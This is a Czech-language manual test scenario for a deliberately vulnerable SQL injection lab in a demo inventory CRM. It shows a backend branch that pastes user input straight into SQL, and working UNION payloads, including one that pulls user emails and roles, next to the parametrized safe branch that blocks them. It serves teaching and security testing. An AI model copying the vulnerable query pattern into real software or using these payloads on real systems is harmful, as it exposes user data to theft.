# Manual scenario: UNION-based SQL Injection v SQLi Labu

Datum ověření: 2026-07-06

Účel scénáře: připravit podklady pro ruční demonstraci UNION-based SQL Injection v modelové aplikaci Simple Inventory CRM.

## Kontext

Testovaný endpoint:

```text
POST /api/sqli-demo/run
```

Podmínky dostupnosti:

- endpoint vyžaduje přihlášeného uživatele,
- uživatel musí mít roli `admin`,
- SQLi Lab musí být povolen přes `DEMO_SQLI_LAB=true`,
- zranitelný režim `mode: "vuln"` je dostupný pouze při `DEMO_VULN=true`.

Společné parametry scénáře:

```json
{
  "pattern": "union",
  "target": "variants",
  "limit": 20
}
```

V odpovědi sledujeme zejména:

- `mode` - zda backend opravdu běžel v režimu `safe` nebo `vuln`,
- `rowCount` - počet vrácených řádků,
- `dataPreview` - ukázku vrácených dat,
- `error` - zda došlo k databázové chybě nebo kontrolovanému selhání dotazu,
- `durationMs` - dobu zpracování requestu na backendu.

## Implementační místo

Rozdíl mezi bezpečnou a zranitelnou větví je implementovaný v:

```text
backend/src/modules/sqliLab/queryFactory.js
```

Strategie pro `pattern: "union"` je v:

```text
backend/src/modules/sqliLab/strategies/union.strategy.js
```

Relevantní část pro `target: "variants"`:

```js
variants: {
  name: "variants",
  selectColumns: [
    "v.id",
    "v.sku",
    "v.variant_name",
    "v.price",
    "v.stock_count",
    "i.name AS item_name",
  ],
  fromClause: "FROM item_variants v JOIN items i ON i.id = v.item_id",
  baseWhere: [],
  defaultOrderBy: "v.id DESC",
  deterministicWhere: "v.id = (SELECT MIN(id) FROM item_variants)",
  search: {
    safe: (q) => ({ sql: "v.sku LIKE ?", params: [`%${q}%`] }),
    vuln: (q) => `v.sku LIKE '%${q}%'`,
  },
},
```

Relevantní část skládání dotazu:

```js
if (mode === "safe") {
  const limitSql = opts.limitMode === "one" ? "\nLIMIT 1" : "\nLIMIT ?";

  return {
    sql: `
SELECT ${spec.selectColumns.join(", ")}
${spec.fromClause}
WHERE ${whereSql}${orderBySql}${limitSql}
      `.trim(),
    params: opts.limitMode === "one" ? params : [...params, effectiveLimit],
    meta: {
      target: spec.name,
      columns: spec.selectColumns.length,
    },
  };
}

const limitSql =
  opts.limitMode === "one" ? "\nLIMIT 1" : `\nLIMIT ${effectiveLimit}`;

return {
  sql: `
SELECT ${spec.selectColumns.join(", ")}
${spec.fromClause}
WHERE ${whereSql}${orderBySql}${limitSql}
    `.trim(),
  params: [],
  meta: {
    target: spec.name,
    columns: spec.selectColumns.length,
  },
};
```

Interpretace rozdílu:

- `safe` větev používá placeholder `?` a hodnoty předává odděleně v `params`,
- `vuln` větev vkládá payload přímo do textu SQL dotazu,
- target `variants` vrací 6 sloupců, proto musí funkční `UNION SELECT` vracet také 6 kompatibilních sloupců.

Pořadí sloupců pro `UNION SELECT`:

| Pozice | Původní sloupec | Význam pro payload |
| ---: | --- | --- |
| 1 | `v.id` | číselný identifikátor |
| 2 | `v.sku` | text, v ukázce lze zobrazit např. e-mail |
| 3 | `v.variant_name` | text, v ukázce lze zobrazit např. roli |
| 4 | `v.price` | číselná hodnota |
| 5 | `v.stock_count` | číselná hodnota |
| 6 | `i.name AS item_name` | text, v ukázce lze zobrazit např. jméno uživatele |

## Testovací requesty

### A. Kontrolní pozitivní vstup

Význam: ověřuje běžné neútočné vyhledávání nad existujícími seedovanými daty.

```http
POST /api/sqli-demo/run
Content-Type: application/json
Authorization: Bearer <admin_token>
```

```json
{
  "mode": "vuln",
  "pattern": "union",
  "target": "variants",
  "payload": "SQLI",
  "limit": 20
}
```

### B. Neplatný UNION payload se špatným počtem sloupců

Význam: ukazuje, že UNION-based SQL Injection musí respektovat syntaktická pravidla databáze, hlavně stejný počet sloupců v původním a připojeném `SELECT` dotazu.

```http
POST /api/sqli-demo/run
Content-Type: application/json
Authorization: Bearer <admin_token>
```

```json
{
  "mode": "vuln",
  "pattern": "union",
  "target": "variants",
  "payload": "NONMATCH%' UNION SELECT 1,2 -- ",
  "limit": 20
}
```

### C. Platný UNION payload s konstantami

Význam: ověřuje, že při správném počtu sloupců lze k původní odpovědi připojit vlastní `SELECT` s kontrolovanými hodnotami.

```http
POST /api/sqli-demo/run
Content-Type: application/json
Authorization: Bearer <admin_token>
```

```json
{
  "mode": "vuln",
  "pattern": "union",
  "target": "variants",
  "payload": "NONMATCH%' UNION SELECT 999,'UNION-SKU','UNION-ROW',0,0,'Injected item' -- ",
  "limit": 20
}
```

### D. Platný UNION payload s daty z tabulky users

Význam: ověřuje, že zranitelná konstrukce umožňuje připojit data z jiné tabulky.

```http
POST /api/sqli-demo/run
Content-Type: application/json
Authorization: Bearer <admin_token>
```

```json
{
  "mode": "vuln",
  "pattern": "union",
  "target": "variants",
  "payload": "NONMATCH%' UNION SELECT u.id,u.email,u.role,0,0,u.name FROM users u -- ",
  "limit": 20
}
```

### E. Stejný UNION payload v bezpečném režimu

Význam: ověřuje, že bezpečná varianta neinterpretuje `UNION` payload jako SQL syntaxi.

```http
POST /api/sqli-demo/run
Content-Type: application/json
Authorization: Bearer <admin_token>
```

```json
{
  "mode": "safe",
  "pattern": "union",
  "target": "variants",
  "payload": "NONMATCH%' UNION SELECT u.id,u.email,u.role,0,0,u.name FROM users u -- ",
  "limit": 20
}
```

## Naměřené výsledky

Test byl spuštěn proti lokálnímu backendu:

```text
http://127.0.0.1:4000
```

Poznámka: testovací requesty nemění seedovaná aplikační data. Standardní přihlášení admina pro získání tokenu může vytvořit audit log, stejně jako běžné používání aplikace.

| Testovací krok | Režim | Payload | HTTP status | rowCount | Chyba | Pozorovaný výsledek |
| --- | --- | --- | ---: | ---: | --- | --- |
| A - kontrolní pozitivní vstup | vuln | `SQLI` | 200 | 2 | `null` | `durationMs=5`; běžné vyhledávání vrátilo seedované varianty `SQLI-LOWSTOCK` a `SQLI-UNION-1`. |
| B - neplatný UNION | vuln | `NONMATCH%' UNION SELECT 1,2 -- ` | 200 | 0 | `Query failed` | `durationMs=5`; databáze payload interpretuje jako SQL, ale dotaz selže kvůli nekompatibilnímu počtu sloupců. |
| C - platný UNION s konstantami | vuln | `NONMATCH%' UNION SELECT 999,'UNION-SKU','UNION-ROW',0,0,'Injected item' -- ` | 200 | 1 | `null` | `durationMs=6`; odpověď obsahuje injektovaný řádek s hodnotami `UNION-SKU`, `UNION-ROW` a `Injected item`. |
| D - platný UNION z users | vuln | `NONMATCH%' UNION SELECT u.id,u.email,u.role,0,0,u.name FROM users u -- ` | 200 | 3 | `null` | `durationMs=3`; odpověď obsahuje data z tabulky `users`, namapovaná do sloupců variant. |
| E - users payload v safe režimu | safe | `NONMATCH%' UNION SELECT u.id,u.email,u.role,0,0,u.name FROM users u -- ` | 200 | 0 | `null` | `durationMs=5`; stejný payload se choval jako hledaná textová hodnota a nepřipojil žádná data z `users`. |

## Ukázky dataPreview

### A. Kontrolní pozitivní vstup

```json
[
  {
    "id": 7,
    "sku": "SQLI-LOWSTOCK",
    "variant_name": "Low Stock Lab Row",
    "price": "2.00",
    "stock_count": 2,
    "item_name": "SQLi Lab Marker"
  },
  {
    "id": 6,
    "sku": "SQLI-UNION-1",
    "variant_name": "Union Baseline Row",
    "price": "1.00",
    "stock_count": 7,
    "item_name": "SQLi Lab Marker"
  }
]
```

### C. Platný UNION payload s konstantami

```json
[
  {
    "id": 999,
    "sku": "UNION-SKU",
    "variant_name": "UNION-ROW",
    "price": "0.00",
    "stock_count": 0,
    "item_name": "Injected item"
  }
]
```

### D. Platný UNION payload s daty z users

```json
[
  {
    "id": 3,
    "sku": "viewer@example.com",
    "variant_name": "user",
    "price": "0.00",
    "stock_count": 0,
    "item_name": "Read Only Tester"
  },
  {
    "id": 2,
    "sku": "user@example.com",
    "variant_name": "user",
    "price": "0.00",
    "stock_count": 0,
    "item_name": "Test User"
  },
  {
    "id": 1,
    "sku": "admin@example.com",
    "variant_name": "admin",
    "price": "0.00",
    "stock_count": 0,
    "item_name": "Admin"
  }
]
```

### E. Safe režim se stejným users payloadem

```json
[]
```

## Závěr pro scénář

Neplatný UNION payload potvrzuje důležitou praktickou vlastnost této techniky: připojený `SELECT` musí odpovídat původnímu dotazu počtem a kompatibilitou sloupců. Payload `UNION SELECT 1,2` proto nestačí, protože target `variants` vrací 6 sloupců.

Funkční UNION payload s konstantami vrací v `dataPreview` hodnoty z připojeného `SELECT` dotazu. To je hlavní důkaz, že vstup nebyl zpracován jako obyčejný text, ale změnil strukturu SQL dotazu.

Payload s tabulkou `users` demonstruje praktický dopad UNION-based SQL Injection: útočník může přes zranitelný dotaz nad variantami připojit data z jiné tabulky, pokud zná nebo odhadne její strukturu a dokáže sladit počet sloupců.

Ve `safe` režimu se stejný users payload neinterpretuje jako SQL syntaxe. Je předán jako datová hodnota přes parametrizovaný dotaz, proto nevrací data z tabulky `users` a `rowCount` zůstává `0`.
